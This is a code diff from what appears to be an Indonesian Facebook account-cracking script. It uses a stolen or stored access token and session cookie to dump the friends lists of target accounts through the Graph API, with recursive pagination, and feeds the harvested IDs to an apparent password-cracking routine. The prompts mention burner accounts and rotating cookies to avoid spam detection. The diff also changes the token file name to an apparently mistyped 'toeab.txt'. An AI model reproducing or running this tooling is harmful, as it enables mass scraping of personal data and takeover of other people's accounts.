@@ -244,7 +244,7 @@ def Menu():
 		#activate_licensi()
 	folder()
 	try:
-		token = open("data/token.txt","r").read()
+		token = open("data/toeab.txt","r").read()
 		coki = {"cookie":open("data/cookie.txt","r").read()}
 		nama = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies=coki).json()['name']
 	except KeyError:
@@ -359,26 +359,40 @@ def MassalPublikGRAPH(token,cookie):
 	try:
 		jum = int(input('%s╰─ %sjumlah target %s > %s'%(P,O,M,K)))
 	except:jum=1
-	print ("\n %sPastikan daftar teman bersifat %sPUBLIK "%(P,H))
+	print ("\n %sPastikan daftar teman bersifat %sPUBLIK\n %sNOTE : %sJika Id Target NOL Tumbalmu Ke %sSPAM %sCoba ganti Cookies"%(P,H,M,P,M,P))
+	cok=[]
 	for t in range(jum):
 		t +=1
 		try:
 			try:
 				user = input('%s╰─ %susername/ID publik %s%s%s > %s'%(P,O,P,H,M,K))
+				cok.append(user)
 				if user in['100067807565861','100028434880529','romi.afrizal.102','romi.alfarabi','']:
 					exit('%s╰─%s gak usah tolol'%(P,M))
 			except AttributeError:
 				exit('%s╰─%s %s tidak di temukan'%(P,M,user))
-			else:
-				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
-				for i in po['friends']['data']:
-					id.append(f"{i['id']}<=>{i['name']}")
 		except KeyError:
 			exit("\n%s GAGAL %smengambil usename/ID....."%(M,P))
-	print (f'\r{P}╰─{O} mengumpulkan id{M} >{H} {len(id)} ')
-	
+	raka_xyz().exec_friends(cok,cookie['cookie'],token)
 	return Crack().romiy(id)
 
+class raka_xyz:
+   def __init__(self):pass
+   def exec_friends(self,auid, kueh, token, limit=None):
+        self.req = requests.Session()
+        for i in auid:
+            try:
+                xyz = {'access_token':token,'after':'' if limit is None else limit}
+                url = self.req.get(f'https://graph.facebook.com/{i}/friends', params=xyz,cookies={'cookie':kueh}).json()
+                for xxx in url['data']:
+                    done = '%s<=>%s'%(xxx['id'], xxx['name'])
+                    print(f'   └─> Berhasil dump {len(id)}',end='\r');sys.stdout.flush()
+                    if done not in id:id.append(done)
+
+                if 'paging' in str(url):
+                   after = url['paging']['cursors']['after']
+                   self.exec_friends(auid, kueh, token ,after)
+            except:pass
 
  # CRACK FOLOWERS 
 def FollowGRAPH(token,cookie):
